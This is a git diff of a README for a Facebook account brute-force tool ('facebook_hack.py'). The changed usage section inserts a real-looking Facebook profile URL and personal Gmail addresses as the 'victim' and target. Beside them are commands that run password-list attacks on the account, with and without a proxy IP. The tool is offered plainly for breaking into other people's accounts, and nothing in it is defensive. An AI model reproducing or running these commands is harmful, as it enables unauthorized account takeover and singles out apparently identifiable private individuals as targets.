@@ -43,17 +43,17 @@ python facebook_hack.py
 ```
 
 ## usage :-
-  - **U can Use Victim email Or Facebook Profile Id**:
+  - **U can Use Victim email Or Facebook Profile Id**: https://www.facebook.com/people/Julie-Uyen/100088283405582
   
-  - **Brute Force On Facebook Account Without proxy**:
+  - **Brute Force On Facebook Account Without proxy**: https://www.facebook.com/people/Julie-Uyen/100088283405582
   
   * **Command**: python facebook_hack.py -t uyencan89@gmail.com -w 10MPASS.txt
   
-  - **Brute Force On Facebook Account With Proxy**:
+  - **Brute Force On Facebook Account With Proxy**: https://www.facebook.com/people/Julie-Uyen/100088283405582
    
     * **Command**: python facebook_hack.py -t uyencan90@gmail.com -w 10MPASS.txt -p 144.217.101.245:3129
     
-    - **Get Target Facebook Profile ID**:
+    - **Get Target Facebook Profile ID**: uyencan90@gmail.com
   
    
     * **Command**: python facebook_hack.py -g https://www.facebook.com/zuck
